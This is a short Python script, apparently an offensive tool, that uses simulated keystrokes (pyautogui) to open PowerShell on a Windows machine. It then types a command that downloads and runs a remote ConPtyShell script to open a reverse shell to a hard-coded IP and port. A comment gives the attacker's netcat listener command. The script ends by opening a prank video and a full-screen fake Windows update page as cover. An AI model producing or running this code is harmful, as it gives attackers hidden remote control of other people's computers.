import pyautogui, time, socket


def exec_revshell():
    #Open powershell
    time.sleep(2)
    pyautogui.hotkey('win', 'r')
    time.sleep(1)
    pyautogui.typewrite('powershell\n')
    time.sleep(2)
    pyautogui.typewrite("IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.20 666\n", interval=0.02)
    
    #For some reason it needs to be on a SUDO SHELL, don't try "sudo command" on a user shell. Use "sudo bash" then the command.
    #NetCat Listener at the attackers pc: stty raw -echo; (stty size; cat) | nc -lvnp 666

    #A little extra
    time.sleep(2.5)
    pyautogui.hotkey('win', 'r')
    pyautogui.typewrite('https://www.youtube.com/watch?v=dQw4w9WgXcQ\n',interval=0.02)
    time.sleep(2.5)
    pyautogui.hotkey('ctrl', 't')
    pyautogui.typewrite('https://updatefaker.com/windows10/index.html\n')
    pyautogui.press('f11')

#exec_revshell()